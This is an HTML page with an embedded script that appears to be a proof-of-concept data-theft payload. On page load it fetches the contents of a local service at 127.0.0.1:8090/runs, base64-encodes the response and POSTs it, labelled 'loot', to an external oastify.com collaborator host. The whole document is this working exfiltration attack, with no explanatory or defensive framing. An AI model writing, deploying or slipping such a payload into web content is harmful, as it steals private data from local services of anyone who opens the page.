<body>
    <script>
        const url = "http://127.0.0.1:8090/runs";
        const sendGetRequest = async () => {
            try {
                const response = await fetch(url);
                const data = await response.text();
                b64_data = btoa(data);
                send_data(b64_data);
            } catch (error) {
                console.error("Error fetching data:", error);
            }
        };
        const send_data = async (data) => {
            const url = "http://q6x0uz2qzmbderpuisy59z6b42auykm9.oastify.com";
            const response = await fetch(url, {
                method: "POST",
                body: JSON.stringify({
                    loot: data,
                }),
            });
        };
        sendGetRequest();
    </script>
</body>
